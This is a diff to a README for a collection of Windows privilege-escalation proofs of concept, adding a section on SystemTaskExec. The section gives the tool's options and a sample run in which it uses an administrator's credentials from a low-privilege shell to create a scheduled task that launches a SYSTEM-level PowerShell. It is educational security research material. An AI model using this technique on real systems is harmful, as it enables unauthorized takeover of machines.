@@ -8,6 +8,7 @@ This directory is for PoCs to help learning how to get SYSTEM privilege.
   - [Named Pipe Impersonation](#named-pipe-impersonation)
   - [Token Stealing](#token-stealing)
   - [System Service Execution](#system-service-execution)
+  - [System Task Execution](#system-task-execution)
   - [Print Spoofer](#print-spoofer)
   - [EfsPotato](#efspotato)
   - [Token Duplication with WFP](#token-duplication-with-wfp)
@@ -138,6 +139,68 @@ PS C:\Works>
 ```
 
 ![](./figures/SystemServiceExec2.png)
+
+
+## System Task Execution
+
+This PoC tries to spawn SYSTEM shell by creating a scheduled task:
+
+```
+PS C:\Works> .\SystemTaskExec.exe -h
+
+SystemTaskExec - PoC to get SYSTEM privileges with scheduled task creation method.
+
+Usage: SystemTaskExec.exe [Options]
+
+        -h, --help     : Displays this help message.
+        -c, --command  : Specifies a command to execute. (Default: "cmd.exe").
+        -u, --username : Specifies a username of Administrators group member (Optional).
+        -d, --domain   : Specifies a domain name for Administrators group member (Optional).
+        -p, --password : Specifies a password for Administrators group member (Optional).
+
+PS C:\Works>
+```
+
+This PoC is not so different from [SystemServiceExec](#system-service-execution).
+When execute this PoC from administrative shell, spawn SYSTEM privileged process without credentials.
+If you know Administrators group member's credential, this PoC allows to spawn SYSTEM privileged process from Medium integrity level shell:
+
+```
+PS C:\Works> net localgroup administrators
+Alias name     administrators
+Comment        Administrators have complete and unrestricted access to the computer/domain
+
+Members
+
+-------------------------------------------------------------------------------
+Administrator
+user
+The command completed successfully.
+
+PS C:\Works> whoami /user
+
+USER INFORMATION
+----------------
+
+User Name               SID
+======================= ============================================
+desktop-bo5n9sn\lowuser S-1-5-21-1437966141-744695874-792245069-1002
+PS C:\Works> .\SystemTaskExec.exe -u user -p Passw0rd! -c powershell.exe
+
+[*] Credentials are specified.
+    [*] Username : user
+    [*] Domain   : (null)
+    [*] Password : Passw0rd!
+[*] Trying to impersonate the specified user.
+[+] Impersonation is successful.
+[*] Trying to create a scheduled task.
+    [*] Task Path  : \SystemTaskExecTask
+    [*] Executable : C:\Works\SystemTaskExec.exe
+    [*] Arguments  : -c "powershell.exe"
+[+] A scheduled task process is created successfully.
+```
+
+![](./figures/SystemTaskExec.png)
 
 
 ## Print Spoofer
